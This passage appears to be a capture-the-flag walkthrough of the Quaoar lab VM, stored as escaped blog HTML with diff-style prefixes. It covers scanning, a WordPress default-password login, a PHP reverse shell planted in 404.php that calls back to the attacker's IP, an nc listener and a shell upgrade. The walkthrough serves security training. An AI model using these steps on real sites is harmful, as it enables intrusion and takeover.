-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# nmap &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T4&lt;/span&gt; 192.168.56.102
-
-Starting Nmap 7.01 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2017-08-19 08:24 EDT
-NSE: Loaded 132 scripts &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;scanning.
-NSE: Script Pre-scanning.
-Initiating NSE at 08:24
-Completed NSE at 08:24, 0.00s elapsed
-Initiating NSE at 08:24
-Completed NSE at 08:24, 0.00s elapsed
-Initiating ARP Ping Scan at 08:24
-Scanning 192.168.56.102 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1 port]
-Completed ARP Ping Scan at 08:24, 0.22s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 total hosts&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using &lt;span class=&quot;nt&quot;&gt;--system-dns&lt;/span&gt; or specify valid servers with &lt;span class=&quot;nt&quot;&gt;--dns-servers&lt;/span&gt;
-Initiating SYN Stealth Scan at 08:24
-Scanning 192.168.56.102 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1000 ports]
-Discovered open port 80/tcp on 192.168.56.102
-Discovered open port 995/tcp on 192.168.56.102
-Discovered open port 110/tcp on 192.168.56.102
-Discovered open port 22/tcp on 192.168.56.102
-Discovered open port 993/tcp on 192.168.56.102
-Discovered open port 53/tcp on 192.168.56.102
-Discovered open port 139/tcp on 192.168.56.102
-Discovered open port 445/tcp on 192.168.56.102
-Discovered open port 143/tcp on 192.168.56.102
-Completed SYN Stealth Scan at 08:24, 1.43s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1000 total ports&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Initiating Service scan at 08:24
-Scanning 9 services on 192.168.56.102
-Completed Service scan at 08:24, 11.02s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;9 services on 1 host&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Initiating OS detection &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;try &lt;span class=&quot;c&quot;&gt;#1) against 192.168.56.102&lt;/span&gt;
-adjust_timeouts2: packet supposedly had rtt of &lt;span class=&quot;nt&quot;&gt;-176545&lt;/span&gt; microseconds.  Ignoring time.
-adjust_timeouts2: packet supposedly had rtt of &lt;span class=&quot;nt&quot;&gt;-176545&lt;/span&gt; microseconds.  Ignoring time.
-NSE: Script scanning 192.168.56.102.
-Initiating NSE at 08:24
-Completed NSE at 08:24, 9.19s elapsed
-Initiating NSE at 08:24
-Completed NSE at 08:24, 0.00s elapsed
-Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;192.168.56.102
-Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00082s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-Not shown: 991 closed ports
-PORT    STATE SERVICE     VERSION
-22/tcp  open  ssh         OpenSSH 5.9p1 Debian 5ubuntu1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-| ssh-hostkey:
-|   1024 d0:0a:61:d5:d0:3a:38:c2:67:c3:c3:42:8f:ae:ab:e5 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;DSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-|   2048 bc:e0:3b:ef:97:99:9a:8b:9e:96:cf:02:cd:f1:5e:dc &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-|_  256 8c:73:46:83:98:8f:0d:f7:f5:c8:e4:58:68:0f:80:75 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-53/tcp  open  domain      ISC BIND 9.8.1-P1
-| dns-nsid:
-|_  bind.version: 9.8.1-P1
-80/tcp  open  http        Apache httpd 2.2.22 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
-| http-methods:
-|_  Supported Methods: POST OPTIONS GET HEAD
-| http-robots.txt: 1 disallowed entry
-|_Hackers
-|_http-server-header: Apache/2.2.22 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-|_http-title: Site doesn&lt;span class=&quot;s1&quot;&gt;'t have a title (text/html).
-110/tcp open  pop3        Dovecot pop3d
-|_pop3-capabilities: RESP-CODES STLS PIPELINING SASL TOP UIDL CAPA
-| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
-| Issuer: commonName=ubuntu/organizationName=Dovecot mail server
-| Public Key type: rsa
-| Public Key bits: 2048
-| Signature Algorithm: sha1WithRSAEncryption
-| Not valid before: 2016-10-07T04:32:43
-| Not valid after:  2026-10-07T04:32:43
-| MD5:   e242 d8cb 6557 1624 38af 0867 05e9 2677
-|_SHA-1: b5d0 537d 0850 11d0 e9c0 fb10 ca07 37c3 af10 9382
-|_ssl-date: 2017-08-19T14:24:32+00:00; +2h00m00s from scanner time.
-139/tcp open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
-143/tcp open  imap        Dovecot imapd
-|_imap-capabilities: IDLE SASL-IR ENABLE more STARTTLS ID have capabilities LOGIN-REFERRALS post-login LOGINDISABLEDA0001 listed LITERAL+ OK IMAP4rev1 Pre-login
-| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
-| Issuer: commonName=ubuntu/organizationName=Dovecot mail server
-| Public Key type: rsa
-| Public Key bits: 2048
-| Signature Algorithm: sha1WithRSAEncryption
-| Not valid before: 2016-10-07T04:32:43
-| Not valid after:  2026-10-07T04:32:43
-| MD5:   e242 d8cb 6557 1624 38af 0867 05e9 2677
-|_SHA-1: b5d0 537d 0850 11d0 e9c0 fb10 ca07 37c3 af10 9382
-|_ssl-date: 2017-08-19T14:24:31+00:00; +2h00m00s from scanner time.
-445/tcp open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
-993/tcp open  ssl/imap    Dovecot imapd
-|_imap-capabilities: IDLE SASL-IR AUTH=PLAINA0001 more ID have capabilities LOGIN-REFERRALS post-login listed LITERAL+ OK IMAP4rev1 ENABLE Pre-login
-| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
-| Issuer: commonName=ubuntu/organizationName=Dovecot mail server
-| Public Key type: rsa
-| Public Key bits: 2048
-| Signature Algorithm: sha1WithRSAEncryption
-| Not valid before: 2016-10-07T04:32:43
-| Not valid after:  2026-10-07T04:32:43
-| MD5:   e242 d8cb 6557 1624 38af 0867 05e9 2677
-|_SHA-1: b5d0 537d 0850 11d0 e9c0 fb10 ca07 37c3 af10 9382
-|_ssl-date: 2017-08-19T14:24:31+00:00; +1h59m59s from scanner time.
-995/tcp open  ssl/pop3    Dovecot pop3d
-|_pop3-capabilities: RESP-CODES PIPELINING USER SASL(PLAIN) TOP UIDL CAPA
-| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
-| Issuer: commonName=ubuntu/organizationName=Dovecot mail server
-| Public Key type: rsa
-| Public Key bits: 2048
-| Signature Algorithm: sha1WithRSAEncryption
-| Not valid before: 2016-10-07T04:32:43
-| Not valid after:  2026-10-07T04:32:43
-| MD5:   e242 d8cb 6557 1624 38af 0867 05e9 2677
-|_SHA-1: b5d0 537d 0850 11d0 e9c0 fb10 ca07 37c3 af10 9382
-|_ssl-date: 2017-08-19T14:24:31+00:00; +1h59m59s from scanner time.
-MAC Address: 08:00:27:BB:CE:22 (Oracle VirtualBox virtual NIC)
-Device type: general purpose
-Running: Linux 2.6.X|3.X
-OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
-OS details: Linux 2.6.32 - 3.5
-Uptime guess: 198.049 days (since Thu Feb  2 06:14:13 2017)
-Network Distance: 1 hop
-TCP Sequence Prediction: Difficulty=260 (Good luck!)
-IP ID Sequence Generation: All zeros
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-Host script results:
-| nbstat: NetBIOS name: QUAOAR, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: &amp;lt;unknown&amp;gt; (unknown)
-| Names:
-|   QUAOAR&amp;lt;00&amp;gt;           Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;
-|   QUAOAR&amp;lt;03&amp;gt;           Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;
-|   QUAOAR&amp;lt;20&amp;gt;           Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;
-|   \x01\x02__MSBROWSE__\x02&amp;lt;01&amp;gt;  Flags: &amp;lt;group&amp;gt;&amp;lt;active&amp;gt;
-|   WORKGROUP&amp;lt;1d&amp;gt;        Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;
-|   WORKGROUP&amp;lt;1e&amp;gt;        Flags: &amp;lt;group&amp;gt;&amp;lt;active&amp;gt;
-|_  WORKGROUP&amp;lt;00&amp;gt;        Flags: &amp;lt;group&amp;gt;&amp;lt;active&amp;gt;
-| smb-os-discovery:
-|   OS: Unix (Samba 3.6.3)
-|   NetBIOS computer name:
-|   Workgroup: WORKGROUP
-|_  System time: 2017-08-19T10:24:30-04:00
-| smb-security-mode:
-|   account_used: guest
-|   authentication_level: user
-|   challenge_response: supported
-|_  message_signing: disabled (dangerous, but default)
-|_smbv2-enabled: Server doesn'&lt;/span&gt;t support SMBv2 protocol
-
-TRACEROUTE
-HOP RTT     ADDRESS
-1   0.82 ms 192.168.56.102
-
-NSE: Script Post-scanning.
-Initiating NSE at 08:24
-Completed NSE at 08:24, 0.00s elapsed
-Initiating NSE at 08:24
-Completed NSE at 08:24, 0.00s elapsed
-Read data files from: /usr/bin/../share/nmap
-OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;25.33 seconds
-           Raw packets sent: 1127 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;51.988KB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | Rcvd: 1122 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;47.336KB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Wow, that's a lot of open ports. I decided to begin from looking at the &lt;b&gt;port 80&lt;/b&gt;. In addition &lt;b&gt;nmap&lt;/b&gt; scan showed disallowed entry, which we have to check out. &lt;/p&gt;
-
-&lt;p&gt;Main directory of the web pages showes only two images. &lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/img/quaoar/htp1.png&quot; alt=&quot;Hack_The_Planet_1&quot; class=&quot;img-responsive center-block&quot; /&gt;
-&lt;br /&gt;
-&lt;img src=&quot;/img/quaoar/htp2.png&quot; alt=&quot;Hack_The_Planet_2&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Now let's take a look at &lt;b&gt;robots.txt&lt;/b&gt;&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;Disallow: Hackers
-Allow: /wordpress/
-   ____                              
-&lt;span class=&quot;c&quot;&gt;#  /___ \_   _  __ _  ___   __ _ _ __&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# //  / / | | |/ _` |/ _ \ / _` | '__|&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;#/ \_/ /| |_| | (_| | (_) | (_| | |   &lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;#\___,_\ \__,_|\__,_|\___/ \__,_|_|   &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Wordpress directory? Seems interesting. By looking at the source code, we know that it's an old version of this CMS. &lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;generator&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;content=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;WordPress 3.9.14&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Let's run a &lt;b&gt;wpscan&lt;/b&gt;, while in meantime I decided to look for common usernames on the &lt;b&gt;wp-login&lt;/b&gt; page. &lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# wpscan &lt;span class=&quot;nt&quot;&gt;--url&lt;/span&gt; http://192.168.56.102/wordpress
-_______________________________________________________________
-        __          _______   _____                  
-        &lt;span class=&quot;se&quot;&gt;\ \ &lt;/span&gt;       / /  __ &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;/ ____|                 
-         &lt;span class=&quot;se&quot;&gt;\ \ &lt;/span&gt; /&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt; / /| |__&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;___   ___  __ _ _ __  
-          &lt;span class=&quot;se&quot;&gt;\ \/&lt;/span&gt;  &lt;span class=&quot;se&quot;&gt;\/&lt;/span&gt; / |  ___/ &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;__ &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;/ __|/ _ | _ &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
-           &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt; /&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt; /  | |     ____&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;__| &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;_| | | | |
-            &lt;span class=&quot;se&quot;&gt;\/&lt;/span&gt;  &lt;span class=&quot;se&quot;&gt;\/&lt;/span&gt;   |_|    |_____/ &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;__|&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;__|_| |_|
-
-        WordPress Security Scanner by the WPScan Team
-                       Version 2.9
-          Sponsored by Sucuri - https://sucuri.net
-   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_
-_______________________________________________________________
-
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] URL: http://192.168.56.102/wordpress/
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Started: Sat Aug 19 08:30:02 2017
-
-&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; The WordPress &lt;span class=&quot;s1&quot;&gt;'http://192.168.56.102/wordpress/readme.html'&lt;/span&gt; file exists exposing a version number
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Interesting header: SERVER: Apache/2.2.22 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Interesting header: X-POWERED-BY: PHP/5.3.10-1ubuntu3
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] XML-RPC Interface available under: http://192.168.56.102/wordpress/xmlrpc.php
-&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Upload directory has directory listing enabled: http://192.168.56.102/wordpress/wp-content/uploads/
-
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] WordPress version 3.9.14 identified from meta generator
-
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] WordPress theme &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;use: twentyfourteen - v1.1
-
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Name: twentyfourteen - v1.1
- |  Location: http://192.168.56.102/wordpress/wp-content/themes/twentyfourteen/
-&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; The version is out of date, the latest version is 1.6
- |  Style URL: http://192.168.56.102/wordpress/wp-content/themes/twentyfourteen/style.css
- |  Referenced style.css: wp-content/themes/twentyfourteen/style.css
- |  Theme Name: Twenty Fourteen
- |  Theme URI: http://wordpress.org/themes/twentyfourteen
- |  Description: In 2014, our default theme lets you create a responsive magazine website with a sleek, modern des...
- |  Author: the WordPress team
- |  Author URI: http://wordpress.org/
-
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Enumerating plugins from passive detection ...
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] No plugins found
-
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Finished: Sat Aug 19 08:30:05 2017
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Requests Done: 41
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Memory used: 8.387 MB
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Elapsed &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;: 00:00:03&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;But wait, there's an &lt;b&gt;admin&lt;/b&gt; account? &lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/img/quaoar/wp-admin.png&quot; alt=&quot;Admin login&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;And there's even more, password of this account is simply &lt;b&gt;admin&lt;/b&gt;! Now we're in the administrator panel of Wordpress, from where we can deploy a &lt;a href=&quot;http://pentestmonkey.net/tools/web-shells/php-reverse-shell&quot;&gt;PHP Reverse Shell&lt;/a&gt;. &lt;/p&gt;
-
-&lt;p&gt;Reemeber to change the IP address. &lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$VERSION&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;1.0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;$ip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'192.168.56.103'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// CHANGE THIS
-&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1234&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;       &lt;span class=&quot;c1&quot;&gt;// CHANGE THIS
-&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$chunk_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1400&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;$write_a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;$error_a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;$shell&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'uname -a; w; id; /bin/sh -i'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;$daemon&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;$debug&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;To put it in the site, I decided to modify the code of &lt;b&gt;404.php&lt;/b&gt; page from the theme. &lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/img/quaoar/wp-shell.png&quot; alt=&quot;Shell&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Then, we only have to set up the listener and navigate to the url of the page. &lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;192.168.56.102/wordpress/wp-content/themes/twentyfourteen/404.php&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# nc &lt;span class=&quot;nt&quot;&gt;-lvp&lt;/span&gt; 1234
-listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 1234 ...
-192.168.56.102: inverse host lookup failed: Unknown host
-connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.56.103] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.56.102] 51795
-Linux Quaoar 3.2.0-23-generic-pae &lt;span class=&quot;c&quot;&gt;#36-Ubuntu SMP Tue Apr 10 22:19:09 UTC 2012 i686 i686 i386 GNU/Linux&lt;/span&gt;
- 11:00:33 up 40 min,  0 users,  load average: 0.01, 0.05, 0.05
-USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
-&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-/bin/sh: 0: can&lt;span class=&quot;s1&quot;&gt;'t access tty; job control turned off&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Let's look for flags! I've found the first one in &lt;b&gt;/home&lt;/b&gt; directory. &lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /home
-&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
-total 12
-drwxr-xr-x  3 root root 4096 Oct 24  2016 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-drwxr-xr-x 22 root root 4096 Oct  7  2016 ..
-drwxr-xr-x  2 root root 4096 Oct 22  2016 wpadmin
-&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;wpadmin
-&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
-total 12
-drwxr-xr-x 2 root    root    4096 Oct 22  2016 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-drwxr-xr-x 3 root    root    4096 Oct 24  2016 ..
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 wpadmin wpadmin   33 Oct 22  2016 flag.txt
-&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;flag.txt
-2bafe61f03117ac66a73c3c514de796e&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Now, it's time to escalate our privilages. And to my amusement, in &lt;b&gt;wp-config.php&lt;/b&gt; there was root password for &lt;b&gt;mysql&lt;/b&gt; database. &lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'import pty;pty.spawn(&quot;/bin/bash&quot;)'&lt;/span&gt;
-www-data@Quaoar:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;var/www
-&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;var/www
-www-data@Quaoar:/var/www&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
-total 3628
-drwxr-xr-x  6 www-data www-data   4096 Oct 24  2016 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-drwxr-xr-x 13 root     root       4096 Jan 15  2017 ..
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 www-data www-data    224 Oct 12  2016 CHANGELOG
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 www-data www-data  35147 Oct 12  2016 COPYING
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 www-data www-data 652654 Oct 23  2016 Hack_The_Planet.jpg
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 www-data www-data 281003 Oct 23  2016 Hack_The_Planet2.jpg
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 www-data www-data 126042 Oct 23  2016 Hack_The_Planet3.jpg
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 www-data www-data   1241 Oct 12  2016 INSTALL
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 www-data www-data   1672 Oct 12  2016 LICENSE
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 www-data www-data 756701 Oct 23  2016 Quaoar.jpg
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 www-data www-data    954 Oct 12  2016 README.md
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 www-data www-data 169045 Oct 23  2016 hack-planet-1280-amox-zone.jpg
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 www-data www-data 261593 Oct 23  2016 hack-planet-high-definition-mobile.jpg
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 www-data www-data 179812 Oct 23  2016 hacker-manifesto-ethical.jpg
